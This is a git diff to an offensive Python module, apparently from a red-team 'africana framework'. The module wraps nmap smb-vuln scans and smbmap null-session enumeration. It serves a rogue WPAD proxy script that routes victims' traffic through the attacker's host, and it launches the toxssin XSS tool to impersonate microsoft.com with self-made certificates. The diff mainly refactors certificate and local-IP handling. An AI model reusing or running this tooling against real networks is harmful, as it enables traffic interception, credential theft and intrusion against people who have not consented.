@@ -1,51 +1,16 @@
 import re
 import sys
 import time
-import socket
 import subprocess
-from OpenSSL import crypto
 from src.core.banner import *
 from src.core.bcolors import *
+from src.core.essentials import *
+from src.core.essentials import *
 from src.scriptures.verses import *
 
 class Interna_Attack(object):
     def __init__(self, host):
         self.host = host
- 
-    def get_local_ip(self):
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        try:
-            s.connect(('10.255.255.255', 1))
-            IP = s.getsockname()[0]
-        except Exception:
-            IP = '127.0.0.1'
-        finally:
-            s.close()
-        return IP
-    os.system('echo "1" > /proc/sys/net/ipv4/ip_forward 2> /dev/null')
-
-    def generate_ssl_cert(self, common_name, cert_file, key_file):
-        k = crypto.PKey()
-        k.generate_key(crypto.TYPE_RSA, 1024)
-
-        cert = crypto.X509()
-        cert.get_subject().C = "KE"
-        cert.get_subject().ST = "Nairobi"
-        cert.get_subject().L = "Langas"
-        cert.get_subject().O = "Cyberafrics"
-        cert.get_subject().OU = "Redteam"
-        cert.get_subject().CN = common_name
-        cert.set_serial_number(1000)
-        cert.gmtime_adj_notBefore(0)
-        cert.gmtime_adj_notAfter(10*365*24*60*60)
-        cert.set_issuer(cert.get_subject())
-        cert.set_pubkey(k)
-        cert.sign(k, 'sha256')
-
-        with open(cert_file, "wt") as f:
-            f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert).decode('utf-8'))
-        with open(key_file, "wt") as f:
-            f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k).decode('utf-8'))
 
     def bettercap_discover(self):
         beauty.graphics(), scriptures.verses()
@@ -57,7 +22,7 @@ class Interna_Attack(object):
     def nmap_pscanner(self, host):
         os.system('clear')
         print(bcolors.BLUE + "~>[ " + bcolors.RED + "Performing port scan on" + bcolors.BLUE + " ]" + bcolors.BLUE + " ~> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
-        process = subprocess.Popen('nmap -v -p- %s'%(host), shell = True).wait()
+        process = subprocess.Popen('nmap -v -Pn -p- %s'%(host), shell = True).wait()
         return process
         print("")
 
@@ -73,6 +38,7 @@ class Interna_Attack(object):
         #print(bcolors.BLUE + "~>[ " + bcolors.RED + "performing smb recon on" + bcolors.BLUE + " ]" + bcolors.BLUE + " ~> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
         #process = subprocess.Popen('enum4linux -a %s' %(host), shell = True).wait()
         print(bcolors.BLUE + "~>[ " + bcolors.RED + "Trying smb null user & pass connect on" + bcolors.BLUE + " ]" + bcolors.BLUE + " ~> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
+        process = subprocess.Popen('nmap -sT -sV -Pn -p 445 --script=smb-vuln* --stats-every 10s %s' %(host), shell = True).wait()
         process = subprocess.Popen('smbmap -H %s -u null -p null -r --depth 5' %(host), shell = True).wait()
         return process
         print("")
@@ -273,9 +239,9 @@ class Interna_Attack(object):
                 try:
                     print("")
                     os.system('ip address')
-                    lhost = input(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Lhost" + bcolors.ENDC + ":" + bcolors.BLUE + "Default" + bcolors.ENDC + ":" + bcolors.YELLOW + "%s" %(internal_scanner.get_local_ip()) + bcolors.GREEN + ")# " + bcolors.ENDC)
+                    lhost = input(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Lhost" + bcolors.ENDC + ":" + bcolors.BLUE + "Default" + bcolors.ENDC + ":" + bcolors.YELLOW + "%s" %(runner.get_local_ip()) + bcolors.GREEN + ")# " + bcolors.ENDC)
                     if len (lhost) == 0:
-                        lhost = str(internal_scanner.get_local_ip())
+                        lhost = str(runner.get_local_ip())
                         time.sleep(1.5)
                     resp_string = """WPADScript = function FindProxyForURL(url, host)[if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "ProxySrv")||shExpMatch(host, "(*.ProxySrv|ProxySrv)")) return "DIRECT"; return 'PROXY %s:3128; PROXY %s:3141; DIRECT';]'"""%(lhost, lhost)
 
@@ -308,19 +274,14 @@ class Interna_Attack(object):
                     break
 
     def toxssin_xss(self):
+        runner.kona_mbaya()
         url = input(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Url to Impersonate" + bcolors.ENDC + ":" + bcolors.BLUE + "Default" + bcolors.ENDC + ":" + bcolors.YELLOW + "microsoft.com" + bcolors.GREEN + ")# " + bcolors.ENDC)
         if len (url) == 0:
             url = "microsoft.com"
         if not re.match(r'http(s?)\:', url):
             url = 'https://' + url
-        if os.path.exists('/root/.africana/certs/'):
-            os.system('clear')
-            os.system('cd src/externals/toxssin; python3 toxssin.py -u %s -c /root/.africana/certs/africana-cert.pem -k /root/.africana/certs/africana-key.pem -v' %(url))
-        elif not os.path.exists('/root/.africana/certs/'):
-            os.system('mkdir -p /root/.africana/certs/')
-            internal_scanner.generate_ssl_cert(common_name = 'africana', cert_file = '/root/.africana/certs/africana-cert.pem', key_file = '/root/.africana/certs/africana-key.pem')
-            os.system('clear')
-            os.system('cd src/externals/toxssin; python3 toxssin.py -u %s -c /root/.africana/certs/africana-cert.pem -k /root/.africana/certs/africana-key.pem -v' %(url))
+        os.system('clear')
+        os.system('cd src/externals/toxssin; python3 toxssin.py -u %s -c /root/.africana/certs/africana-cert.pem -k /root/.africana/certs/africana-key.pem -v' %(url))
 
 internal_scanner = Interna_Attack(host = '')
 
